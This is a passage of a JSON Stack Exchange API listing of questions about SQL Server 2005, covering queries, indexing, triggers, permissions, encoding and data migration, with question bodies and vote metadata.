{"total":14387,"page":8,"pagesize":100,"questions":[{"tags":["java","sql-server","sql-server-2005"],"answer_count":2,"favorite_count":0,"up_vote_count":2,"down_vote_count":0,"view_count":89,"score":2,"question_id":12448668,"title":"connecting to the database engine in Microsoft SQL Server 2005","body":"<p>I had to connect my netbeans application to Microsoft SQL Server 2005 so that I am able to read the data back to application (after I store it !) . But I haven't  been able to create a table yet since I am able to connect to the database engine as it says.</p>\n\n<p>How do I connect to the database engine in Microsoft SQL Server 2005 ? This is what it currently displays when I open <em>Microsoft Server SQL Management Studio</em> :</p>\n\n<p><img src=\"http://i.stack.imgur.com/JKFf2.jpg\" alt=\"enter image description here\"></p>\n\n<p>and this is the SQL Server Configuration Manager :</p>\n\n<p><img src=\"http://i.stack.imgur.com/hg2mU.jpg\" alt=\"enter image description here\"></p>\n\n<p>Now what do I do to connect to the database engine ?</p>\n\n<p><em>Note : Please let me know if I need to add some more information</em></p>\n"},{"tags":["sql","sql-server","sql-server-2005","performance","tsql"],"answer_count":4,"favorite_count":4,"up_vote_count":11,"down_vote_count":0,"view_count":7194,"score":11,"question_id":1662902,"title":"When to use EXCEPT as opposed to NOT EXISTS in Transact SQL?","body":"<p>I just recently learned of the existence of the new \"EXCEPT\" clause in SQL Server (a bit late, I know...) thru reading code written by a coworker. It truly amazed me!</p>\n\n<p>But then I have some questions regarding its usage: when is it recommended to be employed? Is there a difference, performance-wise, between using it versus a correlated query employing \"AND NOT EXISTS...\"?</p>\n\n<p>After reading EXCEPT's article in the BOL I thought it was just a shorthand for the second option, but was surprised when I rewrote a couple queries using it (so they had the \"AND NOT EXISTS\" syntax much more familiar to me) and then checked the execution plans - surprise! The EXCEPT version had a shorter execution plan, and executed faster, also. Is this always so?</p>\n\n<p>So I'd like to know: what are the guidelines for using this powerful tool?</p>\n"},{"tags":["sql-server-2005"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":1,"view_count":44,"score":-1,"question_id":12437110,"title":"Separate numeric & character data using SQL Server 2005 query","body":"<p>I want to separate my data in column, my data is </p>\n\n<pre><code>column1\n1.1.1 Eastern express highway\n1.1.2 weater way\n2.1 water\n2.1.2 land\n2.2 sand\n</code></pre>\n\n<p>My output should be</p>\n\n<pre><code>column1      column2       column3\n1.1            1           Eastern express highway\n1.1            2            weater way\n2.1            0            water\n2.1            2            land\n2.2            0            sand\n</code></pre>\n"},{"tags":["sql-server-2005","function"],"answer_count":5,"favorite_count":1,"up_vote_count":7,"down_vote_count":0,"view_count":29317,"score":7,"question_id":150552,"title":"Executing dynamic SQL in a SQLServer 2005 function","body":"<p>I will preface this question by saying, I do not think it is solvable. I also have a workaround, I can create a stored procedure with an OUTPUT to accomplish this, it is just easier to code the sections where I need this checksum using a function.</p>\n\n<p>This code will not work because of the <code>Exec SP_ExecuteSQL @SQL</code> calls. Anyone know how to execute dynamic SQL in a function? (and once again, I do not think it is possible. If it is though, I'd love to know how to get around it!)</p>\n\n<pre><code>Create Function Get_Checksum\n(\n    @DatabaseName      varchar(100),\n    @TableName         varchar(100)\n)\nRETURNS FLOAT\nAS\nBEGIN\n\n Declare @SQL        nvarchar(4000)\n Declare @ColumnName varchar(100)\n Declare @i          int\n Declare @Checksum   float\n Declare @intColumns table (idRecord int identity(1,1), ColumnName varchar(255))\n Declare @CS         table (MyCheckSum bigint)\n\n Set @SQL = \n        'Insert Into @IntColumns(ColumnName)' + Char(13) + \n        'Select Column_Name' + Char(13) +\n        'From   ' + @DatabaseName + '.Information_Schema.Columns (NOLOCK)' + Char(13) +\n        'Where  Table_Name = ''' + @TableName + '''' + Char(13) +\n        '       and Data_Type = ''int''' \n\n -- print @SQL\n\n exec sp_executeSql @SQL\n\n Set @SQL = \n        'Insert Into @CS(MyChecksum)' + Char(13) + \n        'Select '\n\n Set @i = 1\n\n While Exists(\n       Select 1\n       From   @IntColumns\n       Where  IdRecord = @i)\n begin\n       Select @ColumnName = ColumnName\n       From   @IntColumns\n       Where  IdRecord = @i\n\n       Set @SQL = @SQL + Char(13) + \n            CASE WHEN @i = 1 THEN \n                 '    Sum(Cast(IsNull(' + @ColumnName + ',0) as bigint))'\n                 ELSE\n                 '    + Sum(Cast(IsNull(' + @ColumnName + ',0) as bigint))'\n            END\n\n       Set @i = @i + 1\n end\n\n Set @SQL = @SQL + Char(13) + \n      'From ' + @DatabaseName + '..' + @TableName + ' (NOLOCK)'\n\n -- print @SQL\n\n exec sp_executeSql @SQL\n\n Set @Checksum = (Select Top 1 MyChecksum From @CS)\n\n Return isnull(@Checksum,0)\n\nEND\nGO\n</code></pre>\n"},{"tags":["c#","asp.net","sql-server-2005"],"answer_count":5,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":746,"score":0,"question_id":1319629,"title":"Manipulate SQL data in memory?","body":"<p>I have tables and a lot of sotred procedure that work with sql database.<br />\nFor demonstration purposes I want to load data into memory (maybe dataset that i can then store in session- the demnonstration is limited so server memory cap won't be a problem ?) from my sql tables and manipulate it with my stored procedures.  </p>\n\n<p>Is it possible? Or i need to rewrite all my stored procedures or even replace them with code that works with data set?</p>\n"},{"tags":["sql","sql-server-2005"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":165,"score":0,"question_id":12435469,"title":"Sql query to split one column into two columns","body":"<p>I have one single column as project name, the data in \nproject name </p>\n\n<pre><code>1.1.1 chapter1\n1.1.2 chapter2\n</code></pre>\n\n<p>I want to divide that single column into two columns as</p>\n\n<pre><code>Major   Minor\n1.1     .1 chapter1\n1.1     .2 chapter2\n</code></pre>\n\n<p>the datatype of my project name column is nvarchar,\nI am using sql 2005</p>\n\n<p>Any help?</p>\n"},{"tags":["sql-server-2005","sql-server-2008-r2","service-broker"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":47,"score":0,"question_id":12419887,"title":"SQL Server 2005 Service Broker behaviour for poison messages","body":"<p>When creating a Service Broker Queue in SQL 2008 R2, you can specify the POISON_MESSAGE_HANDLING status as ON or OFF. If it's on, as I understand, after 5 consecutive rollbacks of a message, the message is treated as a poison message, and the queue is automatically disabled. The BROKER_QUEUE_DISABLED event is also raised.</p>\n\n<p>In SQL 2005 (and 2008 non-R2), you don't get the option of the POISON_MESSAGE_HANDLING setting. Does SQL 2005 behave the same as 2008 R2 with this setting ON, or this setting OFF, or something different?</p>\n"},{"tags":["sql","sql-server-2005","sql-order-by","sql-in"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":30,"score":0,"question_id":12435148,"title":"Incorrect order of results in \"IN\" of SQL","body":"<p>I need help in ordering my resultset of SQL Server 2005. My Query is </p>\n\n<pre><code>Select RQuery from EPMaster where PName IN ('PFNAME','POName','PFSName');\n</code></pre>\n\n<p>The result shown is in order as stored in the table <strong>EPMaster</strong></p>\n\n<p>In the table <strong>EPMaster</strong>, the order for values of <strong>PName</strong> are:</p>\n\n<pre><code>PFName -&gt; 1\nPFSName -&gt; 2\nPOName -&gt; 3\n</code></pre>\n\n<p>1 being the topmost and 3 being lowest</p>\n\n<p>I need the results in order of the passed parameters of the query made with <code>IN</code>. It means that the result should be in the form</p>\n\n<pre><code>PFName -&gt; 1\nPOName -&gt; 2\nPFsName -&gt; 3\n</code></pre>\n"},{"tags":["sql-server","sql-server-2008","sql-server-2005","sql-server-2008r2-express"],"answer_count":2,"favorite_count":1,"up_vote_count":1,"down_vote_count":0,"view_count":32,"score":1,"question_id":12391124,"title":"How to create Table with Module name Prefixed?","body":"<p>I downloaded AdentureWorks Database and found a new style to create a table like below.</p>\n\n<ol>\n<li>Sales.SalesOrderHeader</li>\n<li>Person.Person</li>\n<li>Sales.SalesOrderDetail</li>\n</ol>\n\n<p>Can you explain how to create table which can have a module prefix ?</p>\n\n<p>Please let me know if you have any confusion in the query...</p>\n"},{"tags":["sql-server-2005"],"answer_count":0,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":25,"score":0,"question_id":12434734,"title":"Rebuilding / Reorganizing indexes not working properly on sql server 2005","body":"<p>I run script to find Fragmentation level on table named \"ABC\" and found following avg frag. in percentage :-</p>\n\n<p>Index_type_desc                                      avg_fragmentation_in_percent</p>\n\n<p>HEAP                        98.03427419</p>\n\n<p>NONCLUSTERED INDEX  3.495630462</p>\n\n<p>NONCLUSTERED INDEX  100</p>\n\n<p>NONCLUSTERED INDEX  0.601202405</p>\n\n<p>NONCLUSTERED INDEX  60\nNONCLUSTERED INDEX  10.6302202</p>\n\n<p>NONCLUSTERED INDEX  100</p>\n\n<p>NONCLUSTERED INDEX  10.2739726</p>\n\n<p>NONCLUSTERED INDEX  100</p>\n\n<p>NONCLUSTERED INDEX  3.709550118</p>\n\n<p>NONCLUSTERED INDEX  62.5</p>\n\n<p>NONCLUSTERED INDEX  22.15954875</p>\n\n<p>NONCLUSTERED INDEX  100</p>\n\n<p>NONCLUSTERED INDEX  0.651840491</p>\n\n<p>NONCLUSTERED INDEX  6.849315068</p>\n\n<p>Then i applied rebuild / Reorganize indexes on this table through right click on indexes in S.S.M.S. After rebuilding / Reorganizing i run same script to check frag. level then result showing 0 for Nonclustered Indexed but heap index frag. percentage not updating.</p>\n\n<p>And other problem is when i run this script on same table after 24 hours it showing same avg_frag. percentage for all indexes as it was showing before Rebuilding / Reorganizing indexes.</p>\n\n<p>Please tell me where i am doing wrong. And  help me to reduce fragmentation percentage of indexes for fast result from queries.</p>\n\n<p>Thanx in advance</p>\n\n<p>Neel</p>\n"},{"tags":["sql","sql-server-2005","sql-server-2008-r2"],"answer_count":3,"favorite_count":0,"up_vote_count":1,"down_vote_count":6,"view_count":39,"score":-5,"question_id":12413283,"title":"Duplicate Records","body":"<p>I Have table Xtr in Sq Server format is below</p>\n\n<pre><code>OURID   FACLITY\n1           A\n1           b\n2           C\n3           D\n3           b\n3           A\n2           A\n4           B\n5           B\n</code></pre>\n\n<p>I want output like where faclity value are a and b which are having same value like below output</p>\n\n<pre><code>OURID    FACLITY\n1           A\n1           b\n3           b\n3           A\n</code></pre>\n\n<p>Please help</p>\n"},{"tags":["sql-server","sql-server-2008","sql-server-2005","indexing"],"answer_count":6,"favorite_count":14,"up_vote_count":34,"down_vote_count":1,"view_count":14341,"score":33,"question_id":1307990,"title":"Why use the INCLUDE clause when creating an index?","body":"<p>While studying for the 70-433 exam I noticed you can create a covering index in one of the following two ways.</p>\n\n<pre><code>CREATE INDEX idx1 ON MyTable (Col1, Col2, Col3)\n</code></pre>\n\n<p>-- OR --</p>\n\n<pre><code>CREATE INDEX idx1 ON MyTable (Col1) INCLUDE (Col2, Col3)\n</code></pre>\n\n<p>The INCLUDE clause is new to me.  Why would you use it and what guidelines would you suggest in determining whether to create a covering index with or without the INCLUDE clause?</p>\n"},{"tags":["sql","sql-server","sql-server-2005","permissions",".net-assembly"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":56,"score":0,"question_id":12432416,"title":"unsafe assembly permission was denied on object 'server' database 'master'","body":"<p>How do I add permissions for this:</p>\n\n<pre><code>unsafe assembly permission was denied on object 'server' database 'master'\n</code></pre>\n"},{"tags":["sql-server-2005","encoding"],"answer_count":0,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":33,"score":0,"question_id":12433364,"title":"Where to trim/encode/fix characters from end to end ASP to SQL?","body":"<p>I have an ASP Classic app that allows people to copy and paste Word documents into a regular form field. I then post that document via jQuery Ajax to SQL Server, where the information is saved.</p>\n\n<p>My problem is that the curly quotes and other word characters turn into strange characters when they come back out.</p>\n\n<p>I'm trying to filter them on my save routines (classic asp stored procedure), but I still can't quite eliminate the problems.</p>\n\n<p>The ASP pages have this header with the ISO-8859-1 charset. Characters look fine when pasted into the text input fields.</p>\n\n<p><code>&lt;!DOCTYPE html PUBLIC \"-//W3C//DTD XHTML 1.0 Transitional//EN\" \"http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd\"&gt;\n    &lt;html xml:lang=\"en\" xmlns=\"http://www.w3.org/1999/xhtml\" lang=\"en\"&gt;&lt;head&gt;\n    &lt;meta http-equiv=\"Content-Type\" content=\"text/html; charset=ISO-8859-1\"&gt;\n</code></p>\n\n<p>My jQuery code builds the following JSON in the ASP Page:</p>\n\n<p><code>var jsonToSend={ serial: serial, critiqueText: escape(critiqueText) } ;</code></p>\n\n<p>The database collation is set to <strong>SQL_Latin1_General_CP1_CI_AS</strong></p>\n\n<p>I use TEXT and VARCHAR fields to hold the text (yes, I know the Text field type is not preferred, but it's what I have right now).</p>\n\n<p>What must I do at each point to ensure that (1) the Word characters are stripped out, and (2) the encoding is consistent from front to back so I don't get any odd characters displaying?</p>\n\n<p>Oh-  ASP Classic 3 running in 32-bit mode on Windows Server 2003 against SQL Server 2005.</p>\n"},{"tags":["sql","sql-server","query","sql-server-2005"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":82,"score":0,"question_id":12427895,"title":"do query one table if exist else doesn't","body":"<p>I'm working with SQL 2005, and have the following code:</p>\n\n<pre><code>DECLARE @exist4 INT\nIF ( SELECT COUNT(*) existe\n     FROM   sysobjects obj\n     WHERE  obj.name = 'table4'\n   ) &gt; 0 \n    BEGIN \n        SET @exist4 = 1\n    END\nELSE \n    BEGIN \n        SET @exist4 = 0\n    END\n\n/*now if table4 exist i need add to my query but if i do something as it\ni got next error\nInvalid object name 'table4'.*/\n\n\nIF ( @exist4 = 0 ) \n    BEGIN\n\n        SELECT  [table].col1 ,\n                [table].col2 ,\n                [table].col3 ,\n                [table].colN\n        FROM    [table] ,\n                table2 ,\n                table3\n        WHERE   [table].id = table1.id\n                AND table3.id = table2.id\n    END\nELSE \n    BEGIN\n        SELECT  [table].col1 ,\n                [table].col2 ,\n                [table].col3 ,\n                [table].colN\n        FROM    [table] ,\n                table2 ,\n                table3 ,\n                table4\n        WHERE   [table].id = table2.id\n                AND table3.id = table2.id\n                AND table4.id = table3.id\n    END\n</code></pre>\n\n<p>This code returns an error when Table4 does not exist.  How can I get this query to work?</p>\n"},{"tags":["sql-server-2005","ssis"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":29,"score":0,"question_id":12417956,"title":"Import Excel worksheet into SQL 2005","body":"<p>I have an SISS package that imports from Excel into SQL 2005. The name of the worksheet changes baseed on the date the file was created, so a worksheet name would be 20120911. </p>\n\n<p>I want to standardize the worksheet name by automatically changing it. </p>\n\n<p>Is this possible? I've done a lot of searching but haven't found a solution. \nThanks. </p>\n"},{"tags":["sql-server-2005","tsql"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":356,"score":0,"question_id":6741926,"title":"Applying sp_msforeachtable for selected tables","body":"<p>I have a problem in updating some column values in a table. In my database there are many tables and out of which I have to update those tables which is having a column by the name \"Col1\".</p>\n\n<p>If I do</p>\n\n<pre><code>exec sp_msforeachtable 'UPDATE ? SET Col1=\n\ncase when Col1 = \"ppp\" then \"qqq\"\n     when Col1 = \"aaa\" then  \"xxx\" \nend\n' \n</code></pre>\n\n<p>It will report  an error message as</p>\n\n<p><strong>Msg 207, Level 16, State 1, Line 1\nInvalid column name 'col1'.</strong></p>\n\n<p>What to do?</p>\n"},{"tags":["sql-server-2005","pervasive"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":38,"score":0,"question_id":12426605,"title":"Pervasive 9 - Export very large tables","body":"<p>I'm looking for some guidance on exporting very large amounts of data for a migration project from pervasive 9 to a SQL databse.  By very large I'm talking row counts in excess of 10 million.</p>\n\n<p>The throughput of import/export in ssis seems slow to me, so I'm wondering if anyone has domain experience with pervasive and has some performance tips.</p>\n"},{"tags":["sql-server","sql-server-2005","tsql"],"answer_count":4,"favorite_count":1,"up_vote_count":3,"down_vote_count":0,"view_count":7115,"score":3,"question_id":1175244,"title":"SQL Server error on update command - \"A severe error occurred on the current command\"","body":"<p>Running the following query in SQL Server Management Studio gives the error below.</p>\n\n<pre><code>update table_name set is_active = 0 where id  = 3\n</code></pre>\n\n<blockquote>\n  <p>A severe error occurred on the current command.  The results, if any, should be discarded.</p>\n</blockquote>\n\n<ul>\n<li>The logs have been truncated</li>\n<li>there is an update trigger but this isnt the issue</li>\n<li>the transaction count is zero  (@@trancount)</li>\n</ul>\n\n<p>I have tried the same update statement on a couple of other tables in the database and they  work fine.</p>\n\n<pre><code>DBCC CHECKTABLE('table_name');\n</code></pre>\n\n<p>gives</p>\n\n<pre><code>DBCC results for 'table_name'.\nThere are 13 rows in 1 pages for object \"table_name\".\nDBCC execution completed. If DBCC printed error messages, contact your system administrator.\n</code></pre>\n"},{"tags":["sql-server","sql-server-2005"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":2251,"score":0,"question_id":1278622,"title":"A severe error occurred on the current command.  The results, if any, should be discarded","body":"<p>I'm getting an error using SQL Server 2005 stored procedure.</p>\n\n<blockquote>\n  <p>A severe error occurred on the current command.  The results, if any, should be discarded.\"</p>\n</blockquote>\n\n<p>I have a stored proc which saves a record. As far as I can tell this error gets thrown when that procedure gets called too many times in quick succession, or maybe simultaneously by different threads</p>\n\n<p>The proc is very simple, it does a BEGIN TRY.. BEGIN TRAN... IF NOT EXISTS INSERT .. ELSE UPDATE .. COMMIT TRAN .. END TRY</p>\n\n<p>No SQLDUMP file gets created, and nothing gets written into ERRORLOG.</p>\n\n<p>It is a Severity 11 error. The SqlException does not contain State or Number</p>\n\n<p>SQL Server 2005 SP3 (9.00.4035)</p>\n\n<p>How can this be fixed?</p>\n"},{"tags":["sql-server-2005","diagram","restore"],"answer_count":1,"favorite_count":1,"up_vote_count":1,"down_vote_count":0,"view_count":124,"score":1,"question_id":2725974,"title":"SQL 2005 - any way to restore/copy a diagram?","body":"<p>I used the Redgate packager (ran MSI) to reset all the data in my database (i.e. I deleted everything, and let it build the new database).  Unfortunately, I discovered that it didn't retain my diagrams, which has a nice arrangement and several annotations.  </p>\n\n<p>Is there any way to copy/migrate/script the diagram from one database to another (the databases have identical structures). </p>\n\n<p>Thanks,\nNeal Walters </p>\n"},{"tags":["sql-server-2005","oracle9i","dbmigrate"],"answer_count":3,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":188,"score":0,"question_id":3571695,"title":"Convertion from Sql server 2005 to Oracle 9i","body":"<p>I have devloped website using ASP and Sql Server 2005. I have not used any Stored Procedure and Views [All the queries are passed from the asp page]. Now i need to convert the database from SQL Server 2005 to Oracle 9i. </p>\n\n<p>Will it takes huge changes in my code? Is there any tool to convert Sql Server 2005 query to Oracle query?</p>\n"},{"tags":["sql-server","sql-server-2005","database-permissions","database-mail"],"answer_count":3,"favorite_count":0,"up_vote_count":2,"down_vote_count":0,"view_count":4147,"score":2,"question_id":5569511,"title":"How to give access to SQL Server database mail procedures for a Login in a different database?","body":"<p>I'd like to know how to set up permissions within SQL Server to allow my application Login/Role to be able to send email using <code>msdb.dbo.sp_send_dbmail</code>.</p>\n\n<p>I have a database MyDb, a user <code>MyUser</code> who is a member of role <code>AppRole</code>. I have a stored procedure <code>myProc</code> that calls <code>msdb.dbo.sp_send_dbmail</code>. If I execute <code>myProc</code> while logged in as <code>sa</code> it all works fine, but if I execute while logged in as <code>MyUser</code> I get an error: </p>\n\n<blockquote>\n  <p>Msg 229, Level 14, State 5, Procedure sp_send_dbmail, Line 1<br>\n  The EXECUTE permission was denied on the object 'sp_send_dbmail', database 'msdb', schema 'dbo'.</p>\n</blockquote>\n\n<p>My database does not have TRUSTWORTHY ON, therefore I believe I <strong>can't</strong> use EXECUTE AS to impersonate a different user, e.g. create myProc with EXECUTE AS OWNER... (<a href=\"http://msdn.microsoft.com/en-us/library/ms188304.aspx\" rel=\"nofollow\">MSDN reference</a>)</p>\n\n<p>Therefore I think I need to make my user(s) also users within msdb, but can I do this at the Role level or do I need to make each of my database users also users in msdb? </p>\n\n<p>The database mail profile that I'm using is set to public, so I don't think this is related to the profile permissions.</p>\n"},{"tags":["sql","sql-server-2005","tsql"],"answer_count":5,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":527,"score":0,"question_id":8575159,"title":"Inserting large amount of data into SQL Server 2005 table","body":"<p>I am inserting around 2 million records into a SQL Server 2005 table. The table currently have clustered as well as non-clustered indexes. I want to improve the performance of the insert query in that table . Can anyone have idea about </p>\n"},{"tags":["sql","sql-server","sql-server-2005","tsql","sql-server-2008"],"answer_count":4,"favorite_count":3,"up_vote_count":4,"down_vote_count":0,"view_count":3437,"score":4,"question_id":5599874,"title":"How can I check for duplicates before inserting into a table when inserting by select","body":"<p>How can I check for duplicates before inserting into a table when inserting by select:</p>\n\n<pre><code>insert into table1\nselect col1, col2 \nfrom table2\n</code></pre>\n\n<p>I need to check if table1 already has a row with table1.col1.value = table2.col1.value, and if yes, then exclude that row from the insert.</p>\n"},{"tags":["sql","sql-server","sql-server-2005"],"answer_count":2,"favorite_count":1,"up_vote_count":2,"down_vote_count":1,"view_count":90,"score":1,"question_id":12421760,"title":"Sql query to sort numbers & to get output as 1.1.1,1.1.2,1.1.3","body":"<p>I want sql query to get output as </p>\n\n<p><code>1.1.1,1.1.2,1.1.3...</code></p>\n\n<p>I tried order by clause but I am getting result as <code>1.1.1,1.1.10,1.1.11,1.1.2,1.1.3...</code></p>\n\n<p>My procedure is:</p>\n\n<pre><code>select * \n  from Projects,\n where iId in (select value \n                 from ParmsToList(@projectid,',')\n              )\n   And Projects.categoryid  &gt; 0\n order by Projects.vProjectName\n</code></pre>\n"},{"tags":["sql-server-2005"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":26,"score":0,"question_id":12420040,"title":"linking row with a column in sql server","body":"<p>I am trying to get a resultset using two tables</p>\n\n<ol>\n<li>Trail Balance</li>\n<li>Aging</li>\n</ol>\n\n<p>the structure of the tables are</p>\n\n<p><strong>Aging</strong></p>\n\n<pre><code>loc    |    glAcct    |    Amount\n-----------------------------------\n1013   |     1101     |    200\n-----------------------------------\n1211   |     1102     |    300\n-----------------------------------\n</code></pre>\n\n<p><strong>Trial Balance</strong></p>\n\n<pre><code>loc   |    g1101    |   g1102\n------------------------------\n1013  |     20      |    30\n------------------------------\n1211  |     10      |    40\n-----------------------------\n</code></pre>\n\n<p>now what i am trying to do is to match the rows with the columns \nwhat i want now is </p>\n\n<pre><code>loc   |   glAcct    |    agigingAmount |  Trialbalance Amount\n--------------------------------------------------------------\n1013  |     1101    |      200         |        20\n--------------------------------------------------------------\n1211  |     1102    |      300         |        40\n-------------------------------------------------------------     \n</code></pre>\n\n<p>i have tried case statements like</p>\n\n<pre><code>select ag.loc,ag.glAcct,\ncase\n   when ag.glAcct = '1101' then select g1101 from trialbalance \n   when ag.glAcct = '1102' then select gl101 from trialbalance \nend  \n\n from trialbalance tb,Aging ag where ag.loc = tb.loc\n</code></pre>\n\n<p>but its not working.</p>\n\n<p>thanks in advance.</p>\n"},{"tags":["sql-server-2005"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":34,"score":0,"question_id":12419330,"title":"How to create indexed view with select distinct statement in sql 2005","body":"<p>My view named \"Ge_Entry\" is running very very slow so want to create indexed view with select distinct statement but sql server not allowing it.</p>\n\n<p>So i want to know is there any way to create i.view with s.dist statement.</p>\n\n<p>So that i can create indexes on this view for fast results.</p>\n\n<p>Thanx</p>\n\n<p>Neel</p>\n"},{"tags":["visual-studio-2010","sql-server-2005"],"answer_count":0,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":53,"score":0,"question_id":12412369,"title":"Error Deploy01234: on VS 2010 with SQL server 2005","body":"<p>When trying to deploy my solution I receive the message for error Deploy01234. I am able to connect to my database which is located on my machine. When I test the connection it succeeds. When I go to build the solution it succeeds. I've looked up just about everything I can on google, and SO. I'm new to SQL server so I'm sure this is a config error. I am only trying to run the db solution on my machine for testing. I'm not deploying this to azure.</p>\n\n<p>Here is what it's throwing: </p>\n\n<blockquote>\n  <p>C:\\Program Files\n  (x86)\\MSBuild\\Microsoft\\VisualStudio\\v10.0\\TeamData\\Microsoft.Data.Schema.TSqlTasks.targets(120,5):\n  Error Deploy01234: The target database schema provider could not be\n  determined.  Deployment cannot continue.    Done executing task\n  \"SqlDeployTask\" -- FAILED.   Done building target \"DspDeploy\" in\n  project \"Prescient.RView.FDIC.Db.dbproj\" -- FAILED.  Done executing\n  task \"CallTarget\" -- FAILED. Done building target \"DBDeploy\" in\n  project \"Prescient.RView.FDIC.Db.dbproj\" -- FAILED. Done building\n  project \"Prescient.RView.FDIC.Db.dbproj\" -- FAILED.</p>\n  \n  <p>Build FAILED.\n  ========== Build: 1 succeeded or up-to-date, 0 failed, 0 skipped ==========\n  ========== Deploy: 0 succeeded, 1 failed, 0 skipped ==========</p>\n</blockquote>\n"},{"tags":["sql","sql-server-2005"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":185,"score":0,"question_id":12419132,"title":"How to trigger before INSERT statement in stored procedure in SQL Server 2005?","body":"<p>I read this <a href=\"http://stackoverflow.com/questions/6102288/help-with-sql-server-trigger-to-truncate-bad-data-before-insert\">Help with SQL Server Trigger to truncate bad data before insert</a> but not solve my issue when is about stored procedure.</p>\n\n<p><strong>update</strong></p>\n\n<p>Because of my issue <a href=\"http://stackoverflow.com/questions/12407728/why-cannot-create-global-temporary-table-or-truncate-it-when-call-a-stored-proce\">Why cannot create global temporary table or truncate it when call a stored procedure from C# code?</a> when truncate table from stored procedure when it is called from C# code.</p>\n\n<p><strong>end update</strong></p>\n\n<p>The stored procedure is</p>\n\n<pre><code>ALTER PROCEDURE [dbo].[aProcedure]\n  @val1 VARCHAR(255),\n  @val2 VARCHAR(255),\n  ...\nAS \nBEGIN\n   SELECT @sql = '//Do SELECT statement'\n\n    INSERT INTO dbo.MyTable(....)\n\n    SELECT @paramList = ' /*list of parameters*/';\n\n    EXEC sp_executesql @sql, @paramList, ... parameters\nEND\n</code></pre>\n\n<p>And the trigger I used (I'm beginner in SQL)</p>\n\n<pre><code>CREATE TRIGGER MyTrigger ON dbo.MyTable\nFOR INSERT\nAS\nBEGIN\n    TRUNCATE dbo.MyTable\nEND\n</code></pre>\n\n<p>How do trigger, <strong>when from stored procedure the values are inserted into <code>dbo.MyTable</code></strong>, which truncate my table first and after that make <code>INSERT</code> operation ?</p>\n\n<p>I read the documentation from <a href=\"http://msdn.microsoft.com/en-us/library/aa258254%28v=sql.80%29.aspx\" rel=\"nofollow\">MSDN</a> and <a href=\"http://www.codeproject.com/Articles/38808/Overview-of-SQL-Server-database-Triggers\" rel=\"nofollow\">CodeProject</a>.</p>\n\n<p>Thank you</p>\n"},{"tags":["sql-server-2005","jsp"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":30,"score":0,"question_id":12418592,"title":"Add column in sql server 2005","body":"<p>I am using SQL Server 2005 and JSP. I want to add column having name as string object value.</p>\n\n<pre><code>String dr=\"Doctor1\";\n\nstat1=conn.createStatement();\nstat1.executeUpdate(\"ALTER TABLE dbo.PHPL ADD '\"+dr+\"' NVARCHAR(255) Null\");\n</code></pre>\n\n<p>It is giving error near column name.I think I am mistaking with syntax. Please help.</p>\n"},{"tags":["sql","sql-server-2005"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":43,"score":0,"question_id":12293803,"title":"How to insert data to database in another server?","body":"<p>I am using Sql Server 2005.<br>\nThere are two different Sql Servers.<br>\nI need to get data from one server and insert them into database on other server.<br>\nAs a example assume there is two servers call A and B.<br>\nA has DB call ADB and B has DB call BDB.<br>\nI need to get data from ADB and insert them into BDB.</p>\n\n<p>Any suggestion?</p>\n"},{"tags":["sql","tsql","sql-server-2005","linked-server"],"answer_count":2,"favorite_count":0,"up_vote_count":3,"down_vote_count":0,"view_count":55,"score":3,"question_id":12418044,"title":"How to run T-SQL in another DB server?","body":"<p>I want to select some data form another database in another server.</p>\n\n<p>What I know is add a Linked Server, and run the T-SQL.</p>\n\n<p>Is this way is a good choice, or is there any other way to run SQL in other database servers?</p>\n\n<p>thanks.</p>\n"},{"tags":["tsql","sql-server-2005"],"answer_count":3,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":72,"score":1,"question_id":12415715,"title":"TSQL => Take the time from the datetime and convert it into seconds?","body":"<p>I am running SQL Server 2005.  Technically I know how to take the time from a tsql datetime.</p>\n\n<pre><code>CONVERT(VARCHAR(8),GETDATE(),108) AS HourMinuteSecond\n</code></pre>\n\n<p>The problem is that I have a datetime field and I need to essentially grab the time portion convert that to an integer specifically seconds.  Then I need to do a bunch of arithmetic on this integer that I won't discuss here.  I have searched on stackoverflow and haven't found a question that is specific to this question.  Any ideas?  I am really looking for best practices here, I am worried about creating a udf for this specific purpose as it completely throws the query optimizer out the window.</p>\n\n<p>I have seen this webpage so please don't paste this. :</p>\n\n<p><a href=\"http://forums.devx.com/showthread.php?171561-TSQL-Converting-HH-MM-SS-to-seconds\" rel=\"nofollow\">http://forums.devx.com/showthread.php?171561-TSQL-Converting-HH-MM-SS-to-seconds</a></p>\n"},{"tags":["sql","sql-server","sql-server-2005","stored-procedures"],"answer_count":4,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":259,"score":1,"question_id":4016876,"title":"How to dynamically choose which table (with same schema) to select from in stored procedure","body":"<p>I have a bit of an odd database model for a project - I'm going to have several tables with the same definition.  Each table stores information for different clients and because of security restrictions, we cannot put the data together in one table.  So it would look something like this...</p>\n\n<pre><code>\ntable ClientOneData\n(\n    Id (PK, int, not null),\n    Col1 (varchar(50), not null),\n    etc.\n)\n\ntable ClientTwoData\n(\n    Id (PK, int, 